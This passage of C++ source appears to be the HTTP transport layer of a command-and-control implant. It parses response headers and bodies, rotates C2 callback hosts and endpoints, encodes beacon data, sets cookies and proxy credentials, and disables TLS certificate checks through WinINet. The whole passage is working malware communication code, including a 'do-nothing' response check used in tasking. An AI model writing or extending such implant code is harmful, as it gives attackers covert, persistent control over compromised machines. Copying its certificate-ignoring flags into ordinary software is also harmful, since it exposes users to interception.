                hFree( AllHeaders );
                return FALSE;
            }
            
            WCHAR* CurrentLine = AllHeaders;
            BOOL   Found       = FALSE;
            
            WCHAR LowerHeaderName[256] = {0};
            Str::CopyW(LowerHeaderName, (WCHAR*)ServerOut->Header.Ptr);
            for (WCHAR* p = LowerHeaderName; *p; p++) {
                if (*p >= L'A' && *p <= L'Z') {
                    *p = *p + (L'a' - L'A');
                }
            }
            
            while (CurrentLine && *CurrentLine && !Found) {
                WCHAR* LineEnd = nullptr;
                for (WCHAR* p = CurrentLine; *p; p++) {
                    if (*p == L'\r' && *(p + 1) == L'\n') {
                        LineEnd = p;
                        break;
                    }
                }
                
                WCHAR SavedChar = L'\0';
                if (LineEnd) {
                    SavedChar = *LineEnd;
                    *LineEnd = L'\0';
                }
                
                WCHAR* ColonPos = nullptr;
                for (WCHAR* p = CurrentLine; *p; p++) {
                    if (*p == L':') {
                        ColonPos = p;
                        break;
                    }
                }
                
                if (ColonPos) {
                    *ColonPos = L'\0';
                    
                    WCHAR* CurrentHeaderName = CurrentLine;
                    WCHAR* CurrentHeaderValue = ColonPos + 1;
                    
                    while (*CurrentHeaderValue == L' ') {
                        CurrentHeaderValue++;
                    }
                    
                    WCHAR LowerCurrentHeader[256] = {0};
                    Str::CopyW(LowerCurrentHeader, CurrentHeaderName);
                    for (WCHAR* p = LowerCurrentHeader; *p; p++) {
                        if (*p >= L'A' && *p <= L'Z') {
                            *p = *p + (L'a' - L'A');
                        }
                    }
                    
                    BOOL Match = TRUE;
                    WCHAR* p1 = LowerHeaderName;
                    WCHAR* p2 = LowerCurrentHeader;
                    while (*p1 && *p2) {
                        if (*p1 != *p2) {
                            Match = FALSE;
                            break;
                        }
                        p1++;
                        p2++;
                    }
                    
                    if (Match && *p1 == L'\0' && *p2 == L'\0') {
                        SIZE_T WideLen = Str::LengthW(CurrentHeaderValue);
                        
                        SIZE_T AllocSize = (WideLen * 3) + SAFETY_MARGIN;
                        // Caller owns this memory
                        CHAR* HeaderValue = (CHAR*)hAlloc(AllocSize);
                        if (!HeaderValue) {
                            *ColonPos = L':';
                            if (LineEnd) *LineEnd = SavedChar;
                            hFree( AllHeaders );
                            return FALSE;
                        }
                        
                        SIZE_T ConvertedLen = Str::WCharToChar(HeaderValue, CurrentHeaderValue, AllocSize);
                        RespData->Size = ConvertedLen;
                        RespData->Ptr = B_PTR(HeaderValue);
                        Found = TRUE;
                    }
                    
                    *ColonPos = L':';
                }
                
                if (LineEnd) {
                    *LineEnd = SavedChar;
                    CurrentLine = LineEnd + 2;
                } else {
                    break;
                }
            }
            
            hFree( AllHeaders );
                        
            if ( !Found ) {
                KhDbg("Header not found");
                return FALSE;
            }
            break;
        }
        case Output_Body: {
            KhDbg("Processing body response");
            
            UINT32 ContentLength = 0;
            ULONG ContentLenLen = sizeof( ContentLength );
            DWORD BytesRead = 0;
            
            BOOL Success = Self->Wininet.HttpQueryInfoW(
                RequestHandle, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
                &ContentLength, &ContentLenLen, NULL
            );
            
            if ( Success && ContentLength > 0 ) {
                // Caller owns this memory
                RespData->Ptr = B_PTR( hAlloc( ContentLength + SAFETY_MARGIN ) );
                if ( !RespData->Ptr ) {
                    return FALSE;
                }
                
                Self->Wininet.InternetReadFile( RequestHandle, RespData->Ptr, ContentLength, &BytesRead );
                if ( BytesRead != ContentLength ) {
                    KhDbg("Incomplete read");
                    hFree( RespData->Ptr );
                    RespData->Ptr = nullptr;
                    return FALSE;
                }
                
                RespData->Size = BytesRead;
                KhDbg("Body read - %lu bytes", BytesRead);
                return TRUE;
            }
            
            // Chunked reading
            PVOID TmpBuffer = PTR( hAlloc( BEG_BUFFER_LENGTH ) );
            if ( ! TmpBuffer ) {
                return FALSE;
            }
            
            const SIZE_T MAX_RESPONSE_SIZE = 10 * 1024 * 1024;
            SIZE_T RespCapacity = BEG_BUFFER_LENGTH;
            
            // Caller owns this memory
            RespData->Ptr = B_PTR( hAlloc( RespCapacity ) );
            if ( !RespData->Ptr ) {
                hFree( TmpBuffer );
                return FALSE;
            }
            
            RespData->Size = 0;
            
            do {
                Success = Self->Wininet.InternetReadFile( RequestHandle, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );
                if ( !Success || BytesRead == 0 ) break;
                
                if ( (RespData->Size + BytesRead + SAFETY_MARGIN) > RespCapacity ) {
                    SIZE_T newCapacity = max( RespCapacity * 2, RespData->Size + BytesRead + SAFETY_MARGIN );
                    if ( newCapacity > MAX_RESPONSE_SIZE ) {
                        KhDbg("Response too large");
                        hFree( RespData->Ptr );
                        hFree( TmpBuffer );
                        RespData->Ptr = nullptr;
                        return FALSE;
                    }
                    
                    PVOID newBuffer = PTR( hReAlloc( RespData->Ptr, newCapacity ) );
                    if ( !newBuffer ) {
                        KhDbg("Failed to reallocate response buffer");
                        hFree( RespData->Ptr );
                        hFree( TmpBuffer );
                        RespData->Ptr = nullptr;
                        return FALSE;
                    }
                    
                    RespData->Ptr = B_PTR( newBuffer );
                    RespCapacity = newCapacity;
                }
                
                Mem::Copy( PTR( U_PTR( RespData->Ptr ) + RespData->Size ), TmpBuffer, BytesRead );
                RespData->Size += BytesRead;
            } while ( BytesRead > 0 );
            
            hFree( TmpBuffer );
            
            if ( !Success ) {
                hFree( RespData->Ptr );
                RespData->Ptr = nullptr;
                return FALSE;
            }
            
            return TRUE;
        }
        default:
            KhDbg("Unknown server output type");
            return FALSE;
    }
    
    return TRUE;
}

auto DECLFN Transport::OpenInternetSession(
    _In_ HTTP_CONTEXT*   Ctx,
    _In_ HTTP_CALLBACKS* Callback,
    _In_ BOOL            ProxyEnabled,
    _In_ WCHAR*          ProxyUrl
) -> BOOL {
    ULONG HttpAccessType = ProxyEnabled ? INTERNET_OPEN_TYPE_PROXY : 0;
    
    Ctx->SessionHandle = Self->Wininet.InternetOpenW(   
        Callback->UserAgent, HttpAccessType,
        ProxyEnabled ? ProxyUrl : nullptr, 0, 0
    );
    
    if ( ! Ctx->SessionHandle ) {
        KhDbg("Failed to open internet session - Error: %d", KhGetError);
        return FALSE;
    }
    
    KhDbg("Internet session opened");
    return TRUE;
}

auto DECLFN Transport::ConnectToServer(
    _In_ HTTP_CONTEXT* Ctx,
    _In_ HTTP_CALLBACKS* Callback,
    _In_ BOOL   ProxyEnabled,
    _In_ WCHAR* ProxyUsername,
    _In_ WCHAR* ProxyPassword
) -> BOOL {
    Ctx->ConnectHandle = Self->Wininet.InternetConnectW(
        Ctx->SessionHandle, Callback->Host, Callback->Port,
        ProxyEnabled ? ProxyUsername : nullptr, 
        ProxyEnabled ? ProxyPassword : nullptr,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    
    if ( ! Ctx->ConnectHandle ) {
        KhDbg("Failed to connect - Host: %S Port: %u Error: %d", Callback->Host, Callback->Port, KhGetError);
        return FALSE;
    }
    
    KhDbg("Connection established");
    return TRUE;
}

auto DECLFN Transport::SendHttpRequest(
    _In_ HTTP_CONTEXT* Ctx,
    _In_ WCHAR*   Method,
    _In_ WCHAR*   Path,
    _In_ WCHAR*   Headers,
    _In_ MM_INFO* Body,
    _In_ BOOL     Secure
) -> BOOL {
    ULONG HttpFlags = INTERNET_FLAG_RELOAD;
    ULONG OptFlags = 0;
    
    if ( Secure ) {
        HttpFlags |= INTERNET_FLAG_SECURE;
        OptFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_WRONG_USAGE |
                   SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
    }
    
    Ctx->RequestHandle = Self->Wininet.HttpOpenRequestW( 
        Ctx->ConnectHandle, Method, Path, NULL, NULL, NULL, HttpFlags, 0 
    );
    
    if ( !Ctx->RequestHandle ) {
        KhDbg("Failed to open HTTP request - Error: %d", KhGetError);
        return FALSE;
    }
    
    Self->Wininet.InternetSetOptionW( Ctx->RequestHandle, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );
    
    BOOL Success = Self->Wininet.HttpSendRequestW(
        Ctx->RequestHandle, Headers, Headers ? Str::LengthW( Headers ) : 0, 
        Body->Ptr, Body->Size
    );
    
    if ( !Success ) {
        KhDbg("Failed to send HTTP request - Error: %d", KhGetError);
        return FALSE;
    }
    
    KhDbg("HTTP request sent");
    return TRUE;
}

auto DECLFN Transport::HttpSend(
    _In_      MM_INFO* SendData,
    _Out_opt_ MM_INFO* RecvData
) -> BOOL {
    if ( RecvData ) {
        RecvData->Ptr  = nullptr;
        RecvData->Size = 0;
    }
    
    HTTP_CONTEXT Ctx = { 0 };
    Ctx.Success = FALSE;
    
    HTTP_CALLBACKS* Callback = this->StrategyRot();
    if ( ! Callback ) {
        KhDbg("Failed to get C2 callback");
        return FALSE;
    }
    
    KhDbg("host: %ls:%d useragent: %ls secure: %s", Callback->Host, Callback->Port, Callback->UserAgent, Self->Config.Http.Secure ? "TRUE" : "FALSE");
    
    WCHAR*      MethodStr   = nullptr;
    HTTP_METHOD Method      = { 0 };
    MM_INFO     RespData    = { 0 };  
    MM_INFO     DecodedData = { 0 };  
    MM_INFO     EncodedData = { 0 };
    
    if ( ! this->PrepareMethod( Callback, &MethodStr, &Method ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    HTTP_ENDPOINT* Endpoint = Method.Endpoints[Rnd32() % Method.EndpointCount];
    
    KhDbg("method: %ls endpoint: %ls", MethodStr, Endpoint->Path);
    
    OUTPUT_FORMAT  ClientOut     = Endpoint->ClientOutput;
    OUTPUT_FORMAT  ServerOut     = Endpoint->ServerOutput;
    OUTPUT_TYPE    ServerOutType = ServerOut.Type;
    OUTPUT_TYPE    ClientOutType = ClientOut.Type;
    PROXY_SETTINGS Proxy         = Self->Config.Http.Proxy;
    BOOL           Secure        = Self->Config.Http.Secure;

    Ctx.Path = Endpoint->Path;
    
    if ( ! this->PrepareUrl( &Ctx, Callback, Secure ) ) {
        return CleanupHttpContext( &Ctx );
    }

    if ( ! this->EncodeClientData( &Ctx, SendData, &EncodedData, &ClientOut ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    if ( ! this->ProcessClientOutput( &Ctx, &EncodedData, ClientOutType, Endpoint, &Method, &ClientOut ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    if ( ! this->OpenInternetSession( &Ctx, Callback, Proxy.Enabled, Proxy.Url ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    if ( ! this->ConnectToServer( &Ctx, Callback, Proxy.Enabled, Proxy.Username, Proxy.Password ) ) {
        return CleanupHttpContext( &Ctx );
    }
    
    if ( Method.CookiesCount ) {
        for ( int i = 0; i < Method.CookiesCount; i++ ) {
            Self->Wininet.InternetSetCookieW( Ctx.wTargetUrl, Method.Cookies[i]->Key, Method.Cookies[i]->Value );
            KhDbg("Cookie set - Key: %ls", Method.Cookies[i]->Key);
        }
    }
    
    if ( ! this->SendHttpRequest( 
        &Ctx, MethodStr, Ctx.Path ? Ctx.Path : Endpoint->Path,
        Ctx.Headers ? Ctx.Headers : Method.Headers, &Ctx.Body, Secure
    )) {
        return CleanupHttpContext( &Ctx );
    }
    
    ULONG HttpStatusCode = 0;
    ULONG HttpStatusSize = sizeof( HttpStatusCode );
    
    Self->Wininet.HttpQueryInfoW(
        Ctx.RequestHandle, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &HttpStatusCode, &HttpStatusSize, nullptr
    );
    
    KhDbg("HTTP status code: %lu", HttpStatusCode);
    
    if ( HttpStatusCode < 200 || HttpStatusCode >= 300 ) {
        KhDbg("HTTP request failed - Status: %lu", HttpStatusCode);
        return CleanupHttpContext( &Ctx );
    }
    
    if ( ! this->ProcessServerOutput( &Ctx, Ctx.RequestHandle, Ctx.cTargetUrl, ServerOutType, &ServerOut, &RespData ) ) {
        return CleanupHttpContext( &Ctx );
    }

    if ( RespData.Ptr && RespData.Size > 0 && RespData.Size == Method.DoNothingBuff.Size ) {
        if ( Mem::Cmp( RespData.Ptr, Method.DoNothingBuff.Ptr, Method.DoNothingBuff.Size ) ) {
            KhDbg("Response matches do-nothing buffer");
            
            hFree( RespData.Ptr );
            RespData.Ptr = nullptr;
            
            Ctx.Success = TRUE;
            return CleanupHttpContext( &Ctx );
        }
    }
    
    if ( ! this->DecodeServerData( &Ctx, &RespData, &DecodedData, &ServerOut ) ) {
        hFree( RespData.Ptr );
        return CleanupHttpContext( &Ctx );
    }
    
    hFree( RespData.Ptr );
    RespData.Ptr = nullptr;
        
    if ( RecvData ) {
        RecvData->Ptr  = DecodedData.Ptr;
        RecvData->Size = DecodedData.Size;
        KhDbg("Response returned - Size: %zu", DecodedData.Size);
    } else {
        if ( DecodedData.Ptr ) {
            hFree( DecodedData.Ptr );
        }
    }
    
    Ctx.Success = TRUE;
    return CleanupHttpContext( &Ctx );
}

#endif